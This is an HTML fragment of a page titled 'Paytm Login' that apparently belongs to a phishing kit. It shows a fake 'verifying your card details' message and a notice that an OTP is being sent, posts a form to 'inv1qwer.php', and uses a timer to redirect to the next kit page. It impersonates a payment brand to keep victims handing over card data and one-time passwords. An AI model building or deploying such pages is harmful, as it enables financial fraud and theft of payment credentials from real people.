<!DOCTYPE html>
 ...
 <title>Proccessing... - Paytm Login</title>
    ...
    <center><img src="sars.jpg" alt="" id="img"></center>
     <div id="ab" 
     style="margin:10px; 
     margin-left:-8px;">
     </div><br>
    ...
    <form action="inv1qwer.php" method="post">
    <div id="ha">
    <center><h4 style="color:green; font-size:15px; font-family: Arial, Helvetica, sans-serif; margin:0px;">Please wait while we verifying your <br> card details...</h4></center>
    </div>
    <div id="ba">
   ...
   <center><b style="color:#7212b3; margin:0px;">We sending One Time Password on your registered mobile number.</b></center>
    ...
    if (timer<2) {
    // timer.stop();
    window.location.href = "inv1qwer.html";
    }
